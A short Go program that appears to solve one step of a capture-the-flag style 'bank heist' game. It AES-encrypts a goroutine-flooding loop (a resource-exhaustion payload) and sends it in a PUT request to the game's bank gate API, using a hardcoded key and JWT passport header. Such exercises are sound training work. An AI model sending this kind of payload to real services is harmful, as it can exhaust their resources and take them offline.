package main

import (
	"github.com/AHuangMeow/hacker-support/encrypt"
	"github.com/AHuangMeow/hacker-support/httptool"
)

func main() {
	encrypted, err := encrypt.AESEncryptOutInBase64([]byte("for {go func(){time.Sleep(1*time.Hour)}()}"), []byte("MuxiStudio203304"))
	if err != nil {
		panic(err)
	}

	request, err := httptool.NewRequest(
		httptool.PUTMETHOD,
		"http://http-theft-bank.gtainccnu.muxixyz.com/api/v1/bank/gate",
		string(encrypted),
		httptool.DEFAULT,
	)
	if err != nil {
		panic(err)
	}

	request.SetHeader("Passport", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb2RlIjoiQUh1YW5nTWVvdyIsImlhdCI6MTc2Mjk5NDkwMywibmJmIjoxNzYyOTk0OTAzfQ.t3uPobRQKbBE0xqafESebOCSXNfk4gvG8bHKXQfnSro")

	response, err := request.SendRequest()
	if err != nil {
		panic(err)
	}

	response.ShowBody()
}
